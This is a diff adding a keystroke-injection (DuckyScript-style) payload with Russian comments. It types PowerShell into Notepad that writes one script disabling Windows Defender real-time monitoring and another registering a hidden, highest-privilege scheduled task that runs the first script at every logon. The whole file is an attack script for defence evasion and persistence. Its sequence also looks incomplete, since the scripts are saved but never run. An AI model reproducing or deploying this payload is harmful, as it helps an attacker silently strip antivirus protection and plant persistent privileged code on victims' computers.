@@ -1,0 +1,90 @@
+GUI r
+STRING notepad
+ENTER
+DELAY 1000
+STRING $filePath1 = "C:\script.ps1"
+ENTER
+STRING $fileContent1 = @"
+ENTER
+STRING # Отключение антивируса
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING 
+ENTER
+STRING # Здесь можно добавить любую другую команду, которую вы хотите выполнить после отключения антивируса
+ENTER
+STRING # Например:
+ENTER
+STRING Write-Output 'Antivirus has been disabled.'
+ENTER
+STRING 
+ENTER
+STRING # Основной скрипт
+ENTER
+STRING # Ваш основной скрипт или команды
+ENTER
+STRING "@
+ENTER
+STRING [IO.File]::WriteAllText($filePath1, $fileContent1)
+ENTER
+CTRL s
+STRING C:\script_creator.ps1
+ENTER
+DELAY 1000
+STRING $filePath2 = "C:\1create_task.ps1"
+ENTER
+STRING $fileContent2 = @"
+ENTER
+STRING $taskName = 'MyHiddenTask'
+ENTER
+STRING $scriptPath = 'C:\script.ps1'
+ENTER
+STRING $taskDescription = 'This is a hidden task that runs a PowerShell script.'
+ENTER
+STRING 
+ENTER
+STRING # Команда для запуска основного скрипта
+ENTER
+STRING $runScriptCommand = 'powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"'
+ENTER
+STRING 
+ENTER
+STRING # Создание действия для выполнения основного скрипта
+ENTER
+STRING $runScriptAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -File `"$scriptPath`"'
+ENTER
+STRING 
+ENTER
+STRING # Создание триггера, который срабатывает при входе пользователя в систему
+ENTER
+STRING $trigger = New-ScheduledTaskTrigger -AtLogOn
+ENTER
+STRING 
+ENTER
+STRING # Создание принципала с наивысшими правами для текущего пользователя
+ENTER
+STRING $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType S4U -RunLevel Highest
+ENTER
+STRING 
+ENTER
+STRING # Создание задачи для выполнения основного скрипта
+ENTER
+STRING $task = New-ScheduledTask -Action $runScriptAction -Trigger $trigger -Principal $principal -Description $taskDescription
+ENTER
+STRING 
+ENTER
+STRING # Регистрация задачи
+ENTER
+STRING Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
+ENTER
+STRING "@
+ENTER
+STRING [IO.File]::WriteAllText($filePath2, $fileContent2)
+ENTER
+CTRL s
+STRING C:\task_creator.ps1
+ENTER
+DELAY 1000
+STRING exit
+ENTER
